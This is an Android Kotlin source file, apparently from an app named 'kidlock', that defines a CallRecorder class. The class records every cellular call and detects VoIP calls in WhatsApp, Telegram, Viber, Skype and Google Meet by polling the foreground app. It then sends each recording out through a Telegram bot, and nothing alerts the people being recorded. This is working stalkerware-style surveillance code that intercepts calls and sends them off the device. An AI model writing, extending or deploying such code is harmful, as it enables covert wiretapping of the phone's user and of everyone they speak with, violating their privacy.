package com.kidlock

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.telephony.TelephonyManager
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class CallRecorder(private val context: Context) {

    private var recorder: MediaRecorder? = null
    private var outputFile: File? = null
    private var isRecording = false
    private val handler = Handler(Looper.getMainLooper())

    // VOIP app packages to watch
    private val voipApps = setOf(
        "com.whatsapp",
        "com.whatsapp.w4b",
        "org.telegram.messenger",
        "com.viber.voip",
        "com.skype.raider",
        "com.google.android.apps.meetings"
    )

    private val phoneReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
            when (state) {
                TelephonyManager.EXTRA_STATE_OFFHOOK -> startRecording("gsm_call")
                TelephonyManager.EXTRA_STATE_IDLE -> if (isRecording) stopAndSend()
            }
        }
    }

    // VOIP detection via foreground app polling
    private var voipCheckRunning = false
    private var voipActive = false

    private val voipChecker = object : Runnable {
        override fun run() {
            val current = getForegroundApp()
            if (current in voipApps) {
                if (!voipActive && !isRecording) {
                    voipActive = true
                    startRecording("voip_${current.substringAfterLast('.')}")
                }
            } else {
                if (voipActive && isRecording) {
                    voipActive = false
                    stopAndSend()
                }
            }
            if (voipCheckRunning) handler.postDelayed(this, 2000)
        }
    }

    private fun getForegroundApp(): String {
        return try {
            val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
            val now = System.currentTimeMillis()
            val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, now - 5000, now)
            stats.maxByOrNull { it.lastTimeUsed }?.packageName ?: ""
        } catch (e: Exception) { "" }
    }

    fun start() {
        context.registerReceiver(phoneReceiver, IntentFilter(TelephonyManager.ACTION_PHONE_STATE_CHANGED))
        voipCheckRunning = true
        handler.post(voipChecker)
    }

    private fun startRecording(label: String) {
        if (isRecording) return
        try {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            outputFile = File(context.cacheDir, "${label}_$timestamp.mp3")

            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION") MediaRecorder()
            }

            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(outputFile?.absolutePath)
                prepare()
                start()
            }

            isRecording = true
            Log.d("CallRecorder", "Recording started: ${outputFile?.name}")
        } catch (e: Exception) {
            Log.e("CallRecorder", "startRecording error: ${e.message}")
            isRecording = false
        }
    }

    private fun stopAndSend() {
        try {
            recorder?.apply { stop(); release() }
            recorder = null
            isRecording = false

            outputFile?.let { file ->
                if (file.exists() && file.length() > 1024) {
                    TelegramListener.instance.sendAudio(
                        file.absolutePath,
                        "📞 Recording — ${SimpleDateFormat("dd MMM yyyy, HH:mm", Locale.getDefault()).format(Date())}"
                    )
                }
            }
        } catch (e: Exception) {
            Log.e("CallRecorder", "stopAndSend error: ${e.message}")
        }
    }

    fun stop() {
        voipCheckRunning = false
        handler.removeCallbacksAndMessages(null)
        try { context.unregisterReceiver(phoneReceiver) } catch (e: Exception) {}
        if (isRecording) stopAndSend()
    }
}
